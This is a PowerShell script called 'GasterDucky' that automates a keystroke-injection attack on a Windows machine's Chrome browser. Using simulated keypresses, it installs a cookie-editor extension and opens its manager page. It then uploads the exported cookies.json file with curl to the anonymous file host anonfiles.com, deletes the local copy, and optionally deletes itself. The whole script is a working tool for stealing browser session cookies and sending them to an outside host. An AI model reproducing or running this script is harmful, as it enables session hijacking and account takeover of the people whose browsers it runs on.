# FOCUS ENGINE START


Add-Type -Language CSharp -TypeDefinition @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class FocusWindowHelpers
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void BringToFront(IntPtr handle)
        {
            ShowWindow(handle, 5);
            SetForegroundWindow(handle);
        }


        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left, Top, Right, Bottoom;
        }

        public static bool WindowExists(IntPtr handle)
        {
            RECT r;

            return GetWindowRect(handle, out r);
        }


        private delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll")]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsDelegate lpfn, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);

        public static List<KeyValuePair<string, IntPtr>> GetAllExistingWindows()
        {
            var windows = new List<KeyValuePair<string, IntPtr>>();

            EnumDesktopWindows(IntPtr.Zero, (h, _) =>
            {
                StringBuilder title = new StringBuilder(256);
                int titleLength = GetWindowText(h, title, 512);

                if (titleLength > 0)
                    windows.Add(new KeyValuePair<string, IntPtr>(title.ToString(), h));

                return true;
            }, IntPtr.Zero);

            return windows;
        }
    }
"@

function Find-WindowHandle {
    <#
    .SYNOPSIS
    Finds the handle of the window matching the given query.


    .PARAMETER Query
    A query that has one of the following formats:
        - A window handle.
        - A window title followed by its handle enclosed in parentheses.
        - A RegEx pattern that is tested against all existing windows.


    .RETURNS
    An `IntPtr` matching the given query if a window is found; `IntPtr.Zero` otherwise.


    .EXAMPLE
    Find the handle of the first window having 'powershell' in its name.

    Find-WindowHandle powershell

    
    .EXAMPLE
    Find the handle of the first window named 'powershell'.

    Find-WindowHandle '^powershell$'


    .EXAMPLE
    Return the given handle, if a window exists with this handle.

    Find-WindowHandle 10101010


    .EXAMPLE
    Return the given handle, if a window exists with the handle at the end of the given string.

    Find-WindowHandle 'powershell (10101010)'

    #>
    param([String] $Query)

    # Find handle in title (either the whole title is the handle, or enclosed in parenthesis).
    if ($Query -match '^\d+$') {
        $Handle = [IntPtr]::new($Query)
    } elseif ($Query -match '^.+ \((\d+)\)\s*$') {
        $Handle = [IntPtr]::new($Matches[1])
    } else {
        # Find handle in existing processes.
        $MatchingWindows = [FocusWindowHelpers]::GetAllExistingWindows() | ? { $_.Key -match $Query }

        if (-not $MatchingWindows) {
            return [IntPtr]::Zero
        }

        # No need to ensure the window does exist, return immediately.
        return $MatchingWindows[0].Value
    }

    # Make sure the handle exists.
    if ([FocusWindowHelpers]::WindowExists($Handle)) {
        return $Handle
    } else {
        return [IntPtr]::Zero
    }
}

function Focus-Window {
    <#
    .SYNOPSIS
    Focuses the window having the given handle.


    .PARAMETER Query
    A window title query that will be resolved using `Find-WindowHandle`.


    .EXAMPLE
    Focus the first window having 'powershell' in its name.

    Focus-Window powershell

    #>
    param(
        [ValidateScript({
            if ( (Find-WindowHandle $_) -ne 0 ) {
                $true
            } else {
                throw "Cannot find window handle for query '$_'."
            }
        })]
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [String] $Query
    )

    $Handle = Find-WindowHandle $Query

    [FocusWindowHelpers]::BringToFront($Handle)
}


Register-ArgumentCompleter -CommandName Focus-Window -ParameterName Query -ScriptBlock {
    param($CommandName, $ParameterName, $WordToComplete, $CommandAST, $FakeBoundParameter)

    function GetWindowTitleScore {
        <#
        .SYNOPSIS
        Returns the score of the given title when compared with the word we're currently completing.

        The score will be higher depending on which of these conditions is true:
            - The titles are equal (case-sensitive).
            - The titles are equal (case-insensitive).

            - The titles are similar (case-sensitive).
            - The titles are similar (case-insensitive).

            - The title starts with the given word (case-sensitive).
            - The title starts with the given word (case-insensitive).

            - The title contains the given word (case-sensitive).
            - The title contains the given word (case-insensitive).

        #>
        param([String] $Title)

        if (-not $Title.Length) { return 0 }

        if ($WordToComplete -ceq $Title) { return 950 }
        if ($WordToComplete -ieq $Title) { return 900 }
        if ($Title -clike $WordToComplete) { return 850 }
        if ($Title -ilike $WordToComplete) { return 800 }

        if ($Title.StartsWith($WordToComplete)) { return 750 }
        if ($Title.StartsWith($WordToComplete, $True, [cultureinfo]::InvariantCulture)) { return 700 }

        if ($Title -ccontains $WordToComplete) { return 650 }
        if ($Title -icontains $WordToComplete) { return 600 }

        0
    }

    $WindowsScores = [FocusWindowHelpers]::GetAllExistingWindows() | % {
        @{
            Title  = $_.Key;
            Handle = $_.Value;
            Score  = GetWindowTitleScore $_.Key
        }
    }

    $MatchingWindows = $WindowsScores                                               `
                        | ? { $_.Score -gt 0 }                                      `
                        | sort @{ Expression = { $_.Score }; Ascending = $False },  `
                               @{ Expression = { $_.Title }; Ascending = $True  }

    $MatchingWindows | % {
        $Title = "'$($_.Title -creplace "'", "''") ($($_.Handle))'"

        [System.Management.Automation.CompletionResult]::new(
            $Title, $Title, 'ParameterValue', $Title
        )
    }
}


# FOCUS ENGINE END





$GasterDucky = New-Object -ComObject WScript.Shell





write-host "Ready to Ducky!" -ForegroundColor Green
pause
write-host ""



# GasterDucky Script
write-host "GasterDucky Debug" -ForegroundColor Cyan
write-host "Starting chrome.exe with CWS Cookie Extension"
Start-Process chrome.exe "https://chrome.google.com/webstore/detail/cookie-editor/iphcomljdfghbkdcfndaijbokpgddeno"
Start-Sleep -m 700
write-host "Focusing Chrome.exe"
Focus-Window "Chrome"
write-host "Waiting to complete load"
start-sleep -m 1600
$looptab1 = 0
write-host "Executing TAB 9 times" -ForegroundColor Blue
while ($looptab1 -lt 9){
    start-sleep -m 450
    $GasterDucky.SendKeys('{TAB}')
    $looptab1++
}
write-host "TAB Multiple executon Finished" -ForegroundColor Blue
start-sleep -m 300
$gasterducky.SendKeys('{ENTER}')
write-host "ENTER Pressed"

start-sleep -m 700
$GasterDucky.SendKeys('{LEFT}')
write-host "LEFT Pressed"
start-sleep -m 700
$gasterducky.SendKeys('{ENTER}')
write-host "ENTER Pressed"
start-sleep -m 1000

$GasterDucky.SendKeys('{TAB}')
write-host "TAB Pressed"
start-sleep -m 300
$GasterDucky.SendKeys('{ENTER}')
write-host "ENTER Pressed"
start-sleep -m 700



$GasterDucky.SendKeys('^(t)')
write-host "Control + T Pressed"
Start-Sleep -m 300
$GasterDucky.SendKeys('chrome-extension://iphcomljdfghbkdcfndaijbokpgddeno/manager.html')
Write-host "Chain-Text Entered"
start-sleep -m 300
$gasterducky.SendKeys('{ENTER}')
write-host "ENTER Pressed"


write-host "GasterDucky Paused" -ForegroundColor Yellow
write-host "Download cookies.json and press enter to continue" -ForegroundColor Cyan
$SDMODE = read-host "write SD to enable Self-Destruct, enter to normal continue"
write-host "GasterDucky Resumed" -ForegroundColor Cyan
# ANONFILES API START

if(-not(get-command curl.exe)){
    write-warning "curl.exe not found, transferring to Desktop"
    Move-Item $HOME\Downloads\cookies.json $HOME\Desktop\cookies.json
    write-host "cookies.json transferred to Desktop" -ForegroundColor Green
}
else{
    Add-Type -AssemblyName System.Windows.Forms
    $url = "https://api.anonfiles.com/upload"
    write-host "Preparing to upload cookies.json to anonfiles.com" -ForegroundColor Green
    $FileName = "$HOME\Downloads\cookies.json"
    $filetarget = Get-Item -path $FileName
    $filepath = $FileName
    write-host "---------------------"
    $filetarget
    write-host "---------------------"
    write-host "Uploading cookies.json to anonfiles.com"
    $resultraw = curl.exe -F "file=@$filepath" $url
    write-host "---------------------"
    $result = $resultraw | ConvertFrom-Json
    write-host "---------------------"
    if($result.status){
        write-host "Upload successful" -ForegroundColor Green
        write-host "---------------------"
        write-host "Link: $($result.data.file.url.full)" -ForegroundColor Green
        write-host "---------------------"
        write-host "Link copied to clipboard" -ForegroundColor Green
        $result.data.file.url.full | Set-Clipboard
        $result.data.file.url.full > $HOME\Desktop\cookies_captures.txt
        Remove-Item $HOME\Downloads\cookies.json
    }
    else{
        write-host "Upload failed" -ForegroundColor Red
        write-host "---------------------"
        write-host "Error: $($result.error.message)" -ForegroundColor Red
        write-host "---------------------"
    }

}
# ANONFILES API END





# FOOTER ENDING
if($SDMODE -eq "sd"){
    write-host "Self Destructing..."
    delete-item gasterducky.ps1
    if($?){
        write-host "Self Destruct OK" -ForegroundColor Green
    }
    else{
        write-warning "Self Destruct ERROR"
    }
}
write-host "GasterDucky Finished" -ForegroundColor Green
# FOOTER ENDING